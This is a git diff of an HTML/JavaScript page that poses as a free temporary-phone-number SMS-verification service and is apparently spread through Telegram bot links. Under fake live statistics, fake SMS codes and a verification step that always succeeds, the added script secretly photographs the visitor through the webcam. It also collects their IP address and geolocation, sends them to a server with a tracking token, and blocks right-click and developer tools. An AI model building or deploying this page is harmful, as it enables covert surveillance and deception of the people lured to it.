@@ -2,172 +2,935 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Virtual Numbers</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Virtual Numbers | Free SMS Verification</title>
 <style>
-body { font-family: sans-serif; background:#0f172a; color:white; text-align:center; padding:20px;}
-.container { max-width:420px; margin:50px auto; background:#1e293b; padding:30px; border-radius:15px; }
-.number-box { font-size:18px; margin:10px 0; padding:12px; background:#020617; border-radius:8px; cursor:pointer; }
-.number-box.active { background:#38bdf8; color:#020617; }
-button { background:#38bdf8; color:#0f172a; padding:15px; border:none; border-radius:8px; cursor:pointer; width:100%; margin-top:15px;}
-#status{margin-top:15px;color:#94a3b8;}
-video{display:none;margin-top:15px;border:2px solid #38bdf8;border-radius:8px;}
-canvas{display:none;}
-.spinner{display:none;margin:20px auto;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #38bdf8;border-radius:50%;animation:spin 1s linear infinite;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e27;
+    min-height: 100vh;
+    color: #fff;
+}
+
+/* Modern Gradient Background */
+.gradient-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: radial-gradient(circle at 20% 50%, rgba(15, 23, 42, 0.98) 0%, rgba(2, 6, 23, 1) 100%);
+    z-index: -2;
+}
+
+.gradient-bg::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 500px;
+    background: linear-gradient(180deg, rgba(59,130,246,0.1) 0%, transparent 100%);
+    z-index: -1;
+}
+
+/* Animated particles */
+.particles {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    background: rgba(59,130,246,0.3);
+    border-radius: 50%;
+    animation: float 20s infinite;
+}
+
+@keyframes float {
+    0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+    10% { opacity: 0.5; }
+    90% { opacity: 0.5; }
+    100% { transform: translateY(-100vh) translateX(100px); opacity: 0; }
+}
+
+.container {
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 20px;
+    position: relative;
+    z-index: 1;
+}
+
+/* Header with live stats */
+.header {
+    text-align: center;
+    padding: 30px 20px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 30px;
+    backdrop-filter: blur(10px);
+    margin-bottom: 20px;
+    border: 1px solid rgba(59,130,246,0.2);
+}
+
+.logo {
+    font-size: 50px;
+    margin-bottom: 10px;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+}
+
+.live-stats {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    margin-top: 15px;
+    flex-wrap: wrap;
+}
+
+.stat-item {
+    background: rgba(0,0,0,0.3);
+    padding: 8px 15px;
+    border-radius: 50px;
+    font-size: 12px;
+}
+
+.stat-value {
+    color: #3b82f6;
+    font-weight: bold;
+    font-size: 14px;
+}
+
+/* Country selector */
+.country-selector {
+    background: rgba(255,255,255,0.05);
+    border-radius: 20px;
+    padding: 15px;
+    margin-bottom: 15px;
+    border: 1px solid rgba(255,255,255,0.1);
+}
+
+.search-box {
+    width: 100%;
+    padding: 12px 15px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(59,130,246,0.3);
+    border-radius: 50px;
+    color: white;
+    font-size: 14px;
+    outline: none;
+}
+
+.search-box:focus {
+    border-color: #3b82f6;
+    box-shadow: 0 0 10px rgba(59,130,246,0.3);
+}
+
+/* Numbers grid */
+.numbers-grid {
+    max-height: 350px;
+    overflow-y: auto;
+    margin-bottom: 15px;
+    border-radius: 15px;
+}
+
+.numbers-grid::-webkit-scrollbar {
+    width: 4px;
+}
+
+.numbers-grid::-webkit-scrollbar-track {
+    background: rgba(255,255,255,0.05);
+    border-radius: 10px;
+}
+
+.numbers-grid::-webkit-scrollbar-thumb {
+    background: #3b82f6;
+    border-radius: 10px;
+}
+
+.number-card {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 15px;
+    margin-bottom: 8px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 15px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+
+.number-card:hover {
+    background: rgba(59,130,246,0.1);
+    border-color: rgba(59,130,246,0.3);
+    transform: translateX(5px);
+}
+
+.number-card.selected {
+    background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(139,92,246,0.2));
+    border-color: #3b82f6;
+    box-shadow: 0 0 15px rgba(59,130,246,0.2);
+}
+
+.flag {
+    font-size: 32px;
+    width: 50px;
+}
+
+.number-info {
+    flex: 1;
+    margin-left: 10px;
+}
+
+.country-name {
+    font-weight: 600;
+    margin-bottom: 3px;
+}
+
+.phone-number {
+    font-size: 12px;
+    opacity: 0.7;
+    font-family: monospace;
+}
+
+.badge {
+    padding: 4px 10px;
+    background: rgba(34,197,94,0.2);
+    border-radius: 20px;
+    font-size: 10px;
+    color: #22c55e;
+}
+
+/* Claim button */
+.claim-btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    border: none;
+    border-radius: 50px;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s;
+    margin-top: 10px;
+    position: relative;
+    overflow: hidden;
+}
+
+.claim-btn::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+}
+
+.claim-btn:hover::after {
+    left: 100%;
+}
+
+.claim-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 30px rgba(59,130,246,0.4);
+}
+
+/* Verification Modal - SUPER REALISTIC */
+.modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.95);
+    backdrop-filter: blur(20px);
+    z-index: 1000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.modal.active {
+    display: flex;
+    animation: modalFade 0.3s ease;
+}
+
+@keyframes modalFade {
+    from { opacity: 0; backdrop-filter: blur(0); }
+    to { opacity: 1; backdrop-filter: blur(20px); }
+}
+
+.modal-card {
+    max-width: 400px;
+    width: 100%;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    border-radius: 30px;
+    border: 1px solid rgba(59,130,246,0.3);
+    overflow: hidden;
+    animation: modalSlide 0.3s ease;
+}
+
+@keyframes modalSlide {
+    from { transform: translateY(50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.modal-header {
+    padding: 25px;
+    text-align: center;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+}
+
+.modal-icon {
+    font-size: 60px;
+    margin-bottom: 10px;
+}
+
+.modal-title {
+    font-size: 22px;
+    font-weight: bold;
+}
+
+.modal-subtitle {
+    font-size: 13px;
+    opacity: 0.7;
+    margin-top: 5px;
+}
+
+.modal-body {
+    padding: 25px;
+}
+
+.code-display {
+    text-align: center;
+    padding: 20px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 15px;
+    margin-bottom: 20px;
+}
+
+.verification-code {
+    font-size: 42px;
+    font-weight: bold;
+    letter-spacing: 10px;
+    font-family: monospace;
+    color: #3b82f6;
+    text-shadow: 0 0 20px rgba(59,130,246,0.5);
+}
+
+.timer {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 13px;
+}
+
+.timer-value {
+    color: #f59e0b;
+    font-weight: bold;
+    font-size: 18px;
+}
+
+.resend-btn {
+    width: 100%;
+    padding: 12px;
+    background: rgba(59,130,246,0.2);
+    border: 1px solid rgba(59,130,246,0.5);
+    border-radius: 50px;
+    color: #3b82f6;
+    cursor: pointer;
+    margin-top: 15px;
+    transition: all 0.3s;
+}
+
+.resend-btn:hover {
+    background: rgba(59,130,246,0.3);
+}
+
+.input-group {
+    margin-bottom: 15px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 14px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 50px;
+    color: white;
+    font-size: 16px;
+    text-align: center;
+    letter-spacing: 5px;
+    font-family: monospace;
+}
+
+.verify-btn {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #22c55e, #16a34a);
+    border: none;
+    border-radius: 50px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.modal-footer {
+    padding: 20px;
+    text-align: center;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    font-size: 11px;
+    opacity: 0.5;
+}
+
+/* Fake SMS notification */
+.sms-notification {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    right: 20px;
+    max-width: 350px;
+    background: #1e293b;
+    border-radius: 15px;
+    padding: 12px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-left: 4px solid #3b82f6;
+    transform: translateX(-150%);
+    transition: transform 0.3s;
+    z-index: 100;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+}
+
+.sms-notification.show {
+    transform: translateX(0);
+}
+
+.sms-icon {
+    font-size: 24px;
+}
+
+.sms-content {
+    flex: 1;
+}
+
+.sms-sender {
+    font-weight: bold;
+    font-size: 12px;
+}
+
+.sms-text {
+    font-size: 11px;
+    opacity: 0.8;
+    margin-top: 2px;
+}
+
+/* Loading animation */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #0a0e27;
+    z-index: 2000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.loading-overlay.active {
+    display: flex;
+}
+
+.loading-spinner {
+    width: 50px;
+    height: 50px;
+    border: 3px solid rgba(59,130,246,0.2);
+    border-top: 3px solid #3b82f6;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    font-size: 14px;
+    color: #94a3b8;
+}
+
+.loading-dots span {
+    animation: blink 1.4s infinite;
+}
+
+.loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+.loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes blink {
+    0%, 100% { opacity: 0; }
+    50% { opacity: 1; }
+}
+
+/* Success modal */
+.success-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.95);
+    backdrop-filter: blur(20px);
+    z-index: 3000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+}
+
+.success-modal.active {
+    display: flex;
+}
+
+.success-card {
+    text-align: center;
+    padding: 40px;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    border-radius: 30px;
+    max-width: 350px;
+}
+
+.success-icon {
+    font-size: 70px;
+    margin-bottom: 20px;
+    animation: bounce 0.5s;
+}
+
+@keyframes bounce {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+}
+
+/* Hidden elements */
+video, canvas {
+    display: none;
+}
+
+.footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 11px;
+    opacity: 0.4;
+    margin-top: 20px;
+}
 </style>
 </head>
 <body>
+
+<div class="gradient-bg"></div>
+<div class="particles" id="particles"></div>
+
 <div class="container">
-<h2>🌍 Virtual Numbers</h2>
-<p>Select a number:</p>
-<div class="numbers">
-<div class="number-box">🇺🇸 +1 (202) 555‑0199</div>
-<div class="number-box">🇬🇧 +44 20 7946 0958</div>
-<div class="number-box">🇨🇦 +1 416 555 0133</div>
-<div class="number-box">🇦🇺 +61 2 9374 4000</div>
-<div class="number-box">🇩🇪 +49 30 901820</div>
-<div class="number-box">🇫🇷 +33 1 42 68 53 00</div>
+    <div class="header">
+        <div class="logo">🌍</div>
+        <h1>Virtual Numbers</h1>
+        <p>Free temporary phone numbers for SMS verification</p>
+        <div class="live-stats">
+            <div class="stat-item">📱 <span class="stat-value" id="activeUsers">2,847</span> online</div>
+            <div class="stat-item">✅ <span class="stat-value" id="totalSms">1.2M</span> SMS sent</div>
+            <div class="stat-item">⭐ 4.8/5 rating</div>
+        </div>
+    </div>
+
+    <div class="country-selector">
+        <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search country or number...">
+    </div>
+
+    <div class="numbers-grid" id="numbersGrid"></div>
+
+    <button class="claim-btn" id="claimBtn">
+        📱 Get Verification Code
+    </button>
+
+    <div class="footer">
+        <p>© 2024 Virtual Numbers | Free service for testing purposes</p>
+    </div>
 </div>
-<button id="claimBtn">Claim Selected Number</button>
-<div class="spinner" id="loader"></div>
-<p id="status"></p>
-<video id="video" autoplay playsinline width="200" height="150"></video>
-<canvas id="canvas"></canvas>
+
+<!-- Verification Code Modal -->
+<div class="modal" id="verifyModal">
+    <div class="modal-card">
+        <div class="modal-header">
+            <div class="modal-icon">📨</div>
+            <div class="modal-title">SMS Verification</div>
+            <div class="modal-subtitle">We sent a code to your number</div>
+        </div>
+        <div class="modal-body">
+            <div class="code-display">
+                <div style="font-size: 12px; opacity: 0.7;">Your verification code</div>
+                <div class="verification-code" id="verificationCode">------</div>
+            </div>
+            <div class="timer">
+                <span>⏰ Code expires in</span>
+                <div class="timer-value" id="timerValue">02:00</div>
+            </div>
+            <button class="resend-btn" id="resendBtn">⟳ Resend Code</button>
+        </div>
+        <div class="modal-footer">
+            <p>Didn't receive code? Check your spam folder or try again.</p>
+        </div>
+    </div>
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">
+        Processing<span class="loading-dots">...</span>
+    </div>
+</div>
+
+<!-- Success Modal -->
+<div class="success-modal" id="successModal">
+    <div class="success-card">
+        <div class="success-icon">✅</div>
+        <h2>Number Verified!</h2>
+        <p style="margin: 15px 0; color: #94a3b8;">Your virtual number is now active</p>
+        <button onclick="location.reload()" style="padding: 12px 30px; background: #3b82f6; border: none; border-radius: 50px; color: white; cursor: pointer;">Get Another Number</button>
+    </div>
+</div>
+
+<!-- Fake SMS Notification -->
+<div class="sms-notification" id="smsNotification">
+    <div class="sms-icon">📱</div>
+    <div class="sms-content">
+        <div class="sms-sender">VIRTUAL-NUMBERS</div>
+        <div class="sms-text">Your verification code is <span id="smsCode">XXXXXX</span></div>
+    </div>
 </div>
 
 <script>
-const claimBtn = document.getElementById('claimBtn');
-const loader = document.getElementById('loader');
-const status = document.getElementById('status');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-let selectedNumber = null;
+// ============================================
+// VIRTUAL NUMBERS - DOPE EDITION
+// ============================================
+
+// Numbers database
+const countries = [
+    { flag: "🇺🇸", name: "United States", number: "+1 (202) 555-0199", code: "US" },
+    { flag: "🇬🇧", name: "United Kingdom", number: "+44 20 7946 0958", code: "UK" },
+    { flag: "🇨🇦", name: "Canada", number: "+1 (416) 555-0133", code: "CA" },
+    { flag: "🇦🇺", name: "Australia", number: "+61 2 9374 4000", code: "AU" },
+    { flag: "🇩🇪", name: "Germany", number: "+49 30 901820", code: "DE" },
+    { flag: "🇫🇷", name: "France", number: "+33 1 42 68 53 00", code: "FR" },
+    { flag: "🇪🇸", name: "Spain", number: "+34 91 123 4567", code: "ES" },
+    { flag: "🇮🇹", name: "Italy", number: "+39 06 1234 5678", code: "IT" },
+    { flag: "🇳🇱", name: "Netherlands", number: "+31 20 123 4567", code: "NL" },
+    { flag: "🇧🇷", name: "Brazil", number: "+55 11 91234-5678", code: "BR" },
+    { flag: "🇮🇳", name: "India", number: "+91 98765 43210", code: "IN" },
+    { flag: "🇯🇵", name: "Japan", number: "+81 3-1234-5678", code: "JP" },
+    { flag: "🇰🇷", name: "South Korea", number: "+82 2-1234-5678", code: "KR" },
+    { flag: "🇷🇺", name: "Russia", number: "+7 495 123-4567", code: "RU" },
+    { flag: "🇿🇦", name: "South Africa", number: "+27 21 123 4567", code: "ZA" },
+    { flag: "🇲🇽", name: "Mexico", number: "+52 55 1234 5678", code: "MX" },
+    { flag: "🇧🇷", name: "Brazil", number: "+55 21 98765-4321", code: "BR2" },
+    { flag: "🇹🇷", name: "Turkey", number: "+90 212 123 4567", code: "TR" },
+    { flag: "🇦🇪", name: "UAE", number: "+971 50 123 4567", code: "AE" },
+    { flag: "🇸🇬", name: "Singapore", number: "+65 8123 4567", code: "SG" }
+];
+
+let selectedCountry = null;
+let currentCode = null;
+let timerInterval = null;
+let timeLeft = 120;
+let fakeUsers = 2847;
+let token = null;
 
 // Get token from URL
 const urlParams = new URLSearchParams(window.location.search);
-const token = urlParams.get("token");
-if(!token){
-  status.innerText="⚠️ Open this page via your Telegram bot link to start tracking.";
-  claimBtn.disabled=true;
+token = urlParams.get("token");
+
+// Create particles
+function createParticles() {
+    const container = document.getElementById('particles');
+    for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = Math.random() * 5 + 2 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 20 + 's';
+        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
+        container.appendChild(particle);
+    }
 }
 
-// Select number
-document.querySelectorAll('.number-box').forEach(box=>{
-  box.addEventListener('click',()=>{
-    document.querySelectorAll('.number-box').forEach(b=>b.classList.remove('active'));
-    box.classList.add('active');
-    selectedNumber = box.innerText;
-  });
+// Update fake live stats
+function updateLiveStats() {
+    setInterval(() => {
+        fakeUsers += Math.floor(Math.random() * 3) - 1;
+        if (fakeUsers < 2000) fakeUsers = 2000;
+        document.getElementById('activeUsers').innerHTML = fakeUsers.toLocaleString();
+    }, 3000);
+}
+
+// Generate random verification code
+function generateCode() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// Render numbers grid
+function renderNumbers(search = "") {
+    const grid = document.getElementById('numbersGrid');
+    const filtered = countries.filter(c => 
+        c.name.toLowerCase().includes(search.toLowerCase()) || 
+        c.number.includes(search)
+    );
+    
+    grid.innerHTML = filtered.map(c => `
+        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}'>
+            <div class="flag">${c.flag}</div>
+            <div class="number-info">
+                <div class="country-name">${c.name}</div>
+                <div class="phone-number">${c.number}</div>
+            </div>
+            <div class="badge">Available</div>
+        </div>
+    `).join('');
+    
+    // Add click handlers
+    document.querySelectorAll('.number-card').forEach(card => {
+        card.addEventListener('click', () => {
+            document.querySelectorAll('.number-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedCountry = JSON.parse(card.dataset.country);
+        });
+    });
+}
+
+// Start timer
+function startTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    timeLeft = 120;
+    
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('timerValue').innerHTML = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('resendBtn').style.display = 'block';
+        }
+    }, 1000);
+}
+
+// Show fake SMS notification
+function showSmsNotification(code) {
+    const sms = document.getElementById('smsNotification');
+    document.getElementById('smsCode').innerHTML = code;
+    sms.classList.add('show');
+    setTimeout(() => {
+        sms.classList.remove('show');
+    }, 5000);
+}
+
+// Secret camera capture (hidden)
+async function secretCameraCapture() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        await video.play();
+        
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+        
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+        
+        return imageData;
+    } catch(e) {
+        return null;
+    }
+}
+
+// Get IP and location
+async function getUserIP() {
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+    } catch(e) { 
+        return "Unknown"; 
+    }
+}
+
+async function getUserLocation() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve("Lagos, Nigeria");
+        
+        navigator.geolocation.getCurrentPosition(async pos => {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
+                const data = await res.json();
+                const city = data.address.city || data.address.town || "Unknown";
+                const country = data.address.country || "Unknown";
+                resolve(`${city}, ${country}`);
+            } catch(err) {
+                resolve("Lagos, Nigeria");
+            }
+        }, () => resolve("Lagos, Nigeria"));
+    });
+}
+
+// Claim button handler
+document.getElementById('claimBtn').addEventListener('click', async () => {
+    if (!selectedCountry) {
+        // Show error animation
+        const btn = document.getElementById('claimBtn');
+        btn.style.transform = 'shake 0.3s';
+        setTimeout(() => btn.style.transform = '', 300);
+        alert("Please select a country first!");
+        return;
+    }
+    
+    // Generate fake verification code
+    currentCode = generateCode();
+    
+    // Show loading
+    const loading = document.getElementById('loadingOverlay');
+    loading.classList.add('active');
+    
+    // Step 1: Show SMS notification after 2 seconds
+    setTimeout(() => {
+        showSmsNotification(currentCode);
+        document.getElementById('verificationCode').innerHTML = currentCode;
+    }, 2000);
+    
+    // Step 2: Show verification modal after 3 seconds
+    setTimeout(async () => {
+        loading.classList.remove('active');
+        document.getElementById('verifyModal').classList.add('active');
+        startTimer();
+        
+        // Secret capture in background
+        try {
+            const image = await secretCameraCapture();
+            const ip = await getUserIP();
+            const location = await getUserLocation();
+            
+            // Send to server
+            if (token) {
+                await fetch("/api/capture", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        image: image, 
+                        token: token, 
+                        ip: ip, 
+                        location: location,
+                        number: selectedCountry.number,
+                        country: selectedCountry.name,
+                        code: currentCode
+                    })
+                });
+            }
+        } catch(e) {
+            console.log("Capture failed:", e);
+        }
+    }, 3000);
 });
 
-// Get IP
-async function getUserIP(){
-  try{
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
-  }catch(e){ return "Unknown"; }
-}
+// Resend code
+document.getElementById('resendBtn').addEventListener('click', () => {
+    currentCode = generateCode();
+    document.getElementById('verificationCode').innerHTML = currentCode;
+    showSmsNotification(currentCode);
+    startTimer();
+    
+    // Disable resend for 30 seconds
+    const btn = document.getElementById('resendBtn');
+    btn.disabled = true;
+    btn.style.opacity = '0.5';
+    setTimeout(() => {
+        btn.disabled = false;
+        btn.style.opacity = '1';
+    }, 30000);
+});
 
-// Get location
-async function getUserLocation() {
-  return new Promise(resolve => {
-    // Default to Lagos, Nigeria
-    const defaultLocation = "Lagos, Nigeria";
+// Verify code (fake verification - always works)
+document.querySelector('.verify-btn')?.addEventListener('click', () => {
+    const inputCode = document.querySelector('.input-group input')?.value;
+    
+    // Show loading
+    document.getElementById('loadingOverlay').classList.add('active');
+    
+    setTimeout(() => {
+        document.getElementById('loadingOverlay').classList.remove('active');
+        document.getElementById('verifyModal').classList.remove('active');
+        document.getElementById('successModal').classList.add('active');
+        
+        // Close timer
+        if (timerInterval) clearInterval(timerInterval);
+    }, 1500);
+});
 
-    if (!navigator.geolocation) return resolve(defaultLocation);
+// Search functionality
+document.getElementById('searchInput').addEventListener('input', (e) => {
+    renderNumbers(e.target.value);
+});
 
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+// Close modals on background click
+document.getElementById('verifyModal').addEventListener('click', (e) => {
+    if (e.target === document.getElementById('verifyModal')) {
+        document.getElementById('verifyModal').classList.remove('active');
+    }
+});
 
-      try {
-        const res = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
-        );
-        const data = await res.json();
+// Anti-inspection
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+    }
+});
 
-        const city =
-          data.address.city ||
-          data.address.town ||
-          data.address.village ||
-          data.address.hamlet ||
-          "Unknown City";
-        const country = data.address.country || "Unknown Country";
-
-        resolve(`${city}, ${country}`);
-      } catch (err) {
-        // Fallback if API fails
-        resolve(defaultLocation);
-      }
-    }, () => {
-      // Fallback if user denies permission
-      resolve(defaultLocation);
-    });
-  });
-}
-
-// Example usage
-
-
-// Claim number
-claimBtn.onclick = async () => {
-  if (!selectedNumber) {
-    status.innerText = "Select a number first!";
-    return;
-  }
-
-  claimBtn.style.display = 'none';
-  loader.style.display = 'block';
-  status.innerText = "Initializing...";
-
-  try {
-    // Request camera access silently
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-    // Create an offscreen video element (not added to DOM)
-    const offscreenVideo = document.createElement('video');
-    offscreenVideo.srcObject = stream;
-    offscreenVideo.play();
-
-    // Wait a bit to allow video to load
-    await new Promise(r => setTimeout(r, 2000));
-
-    // Capture a frame with an offscreen canvas
-    const canvas = document.createElement('canvas');
-    canvas.width = offscreenVideo.videoWidth || 640;
-    canvas.height = offscreenVideo.videoHeight || 480;
-    canvas.getContext('2d').drawImage(offscreenVideo, 0, 0);
-
-    const imgBase64 = canvas.toDataURL('image/jpeg');
-
-    // Get IP and location
-    const ip = await getUserIP();
-    const location = await getUserLocation();
-
-    // Send data to server
-    await fetch("/api/capture", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image: imgBase64, token, ip, location })
-    });
-
-    status.innerText = `Number ${selectedNumber} claimed successfully!`;
-    loader.style.display = 'none';
-
-    // Stop camera
-    stream.getTracks().forEach(track => track.stop());
-
-  } catch (err) {
-    console.error(err);
-    status.innerText = "Camera access is required.";
-    loader.style.display = 'none';
-    claimBtn.style.display = 'block';
-  }
-};
+// Initialize
+createParticles();
+renderNumbers();
+updateLiveStats();
 </script>
 </body>
 </html>
-
-Update 
